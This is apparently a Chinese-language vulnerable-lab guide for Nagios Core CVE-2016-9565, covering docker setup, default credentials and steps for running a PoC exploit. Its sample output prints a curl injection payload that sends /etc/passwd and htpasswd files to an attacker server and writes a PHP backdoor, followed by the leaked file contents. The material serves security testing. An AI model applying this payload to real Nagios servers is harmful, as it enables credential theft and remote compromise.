## Nagios Core < 4.2.2 代码执行漏洞（CVE-2016-9565）

### 漏洞信息

 * [Nagios Core < 4.2.2 Curl Command Injection/Code Execution](https://legalhackers.com/advisories/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html)

Nagios 是一款监控IT基础设施的程序，近日安全研究人员 Dawid Golunski 发现在 Nagios Core 中存在一个代码执行漏洞：攻击者首先伪装成 RSS 订阅源，当受害应用获取 RSS 信息时攻击者将恶意构造的数据传给受害者，程序在处理过程中将恶意数据注入到了 curl 的命令中，进而代码执行。


### 漏洞分析

参考: [Nagios Core 代码执行漏洞（CVE-2016-9565）分析](http://paper.seebug.org/146/)

### 镜像信息

类型 | 用户名 | 密码
:-:|:-:|:-:
HTTP 基础认证 | nagiosadmin | admin
Web 路径 | /nagios/ | -
Web 物理路径 | /usr/local/nagios/share | -
PoC/Exp 路径 | /nagios/exp.php?url=http://xx.xxx.xxx.xx/ | -

### 获取环境:

1. 拉取镜像到本地

 ```
$ docker pull medicean/vulapps:n_nagios_1
 ```

2. 启动环境

 ```
$ docker run -d -p 8000:80 medicean/vulapps:n_nagios_1
 ```
 > `-p 8000:80` 前面的 8000 代表物理机的端口，可随意指定。 

访问: `http://127.0.0.1:8000/nagios/` 出现基础认证框则代表成功

### 使用与利用

#### Exp 使用

> 假定攻击者服务器 IP 地址为：2.2.2.2

1. 在攻击者服务器运行 nagios_cmd_injection.py

 ```
sudo python nagios_cmd_injection.py 2.2.2.3 9999
 ```

 > 2.2.2.3 是攻击者监听反弹 shell 的IP地址，可与RSS地址一样

2. 访问 http://xxxx/nagios/exp.php?url=http://2.2.2.2/

 输入 HTTP 基础认证的账号密码

 > exp.php 是验证漏洞时添加的，真实环境中不存在。注意最后一个 `/`

3. 在攻击者服务器看到如下输出即代表成功 

 ```
 ➜ sudo python nagios_cmd_injection.py 192.168.30.194 8080

 Nagios Core < 4.2.0 Curl Command Injection / Code Execution PoC Exploit
 CVE-2016-9565
 nagios_cmd_injection.py ver. 1.0

 [+] Generating SSL certificate for our python HTTPS web server

 [+] Starting the web server on ports 80 & 443

 [+] Web server ready for connection from Nagios (http://target-svr/nagios/rss-corefeed.php). Time for your dnsspoof magic... ;)

 [+] Received GET request from Nagios server (192.168.30.xxx) ! Sending redirect to inject our curl payload:

 -Fpasswd=@/etc/passwd -Fgroup=@/etc/group -Fhtauth=@/usr/local/nagios/etc/htpasswd.users --trace-ascii /usr/local/nagios/share/nagios-backdoor.php

 [+] Success, curl payload injected! Received data back from the Nagios server 192.168.30.xxx

 [*] Contents of /etc/passwd file from the target:

 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
 backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
 nagios:x:999:999::/usr/local/nagios:

 [*] Contents of /usr/local/nagios/etc/htpasswd.users file:

 nagiosadmin:$apr1$c3z3k5K8$lk.GET0vWb.WWJidJt84o1
```

### 参考链接

* [Nagios Core < 4.2.2 Curl Command Injection/Code Execution](https://legalhackers.com/advisories/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html)
* [Nagios Core 代码执行漏洞（CVE-2016-9565）分析](http://paper.seebug.org/146/)
